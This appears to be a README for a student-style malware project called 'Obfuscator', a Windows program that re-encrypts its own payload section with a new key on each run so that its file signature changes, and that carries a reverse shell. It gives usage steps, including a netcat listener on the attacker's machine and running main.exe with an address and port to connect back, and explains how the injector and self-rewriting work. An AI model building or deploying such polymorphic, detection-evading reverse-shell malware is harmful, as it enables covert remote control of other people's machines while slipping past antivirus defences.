# Obfuscator

### Usage:
- (local) build the project, a CMakeLists.txt is included
- (local) run `{build}\injector.exe`
- (remote) run `nc -lvp {port}` on the remote machine
- (local) run `{build}\main.exe {address} {port}`

### Audit questions:
1. what is polymorphic encryption?
   - encryption just reffers to the scrambling of a section of the code
   - polymorphic just means that the scrambling can change on its own
     - which usually also requires the encrypter (and decryptor) to change
2. how did you change the signature with each execution? / how does your program work?
   - before the developer releases the program, they run the injector, which injects information about the program into the .replace section, currently:
     1. .payload section virtual memory offset from .replace
     2. .payload section virtual size
     3. the encryption/decryption key
     4. start position of the .replace section in the file
     5. start position of the .payload section in the file
   - the program decrypts the .payload section (using fields 1, 2, and 3)
   - the program moves the file and copies it to where it used to be
   - the program copies and then encrypts the .payload to the heap with a new key (using fields 1 and 2)
   - the program overwrites the .payload section and the key in the new file (using fields 4, 2 and 5)
   - then it just enters the payload

### Limitations:
- IMAGE_FILE_RELOCS_STRIPPED is forced true by the injector, main.exe may just refuse to run in certain situations (havent had that happen)
- the reverse shell needs to be used with netcat instead of ssh, it was a massive waste of time trying to get that working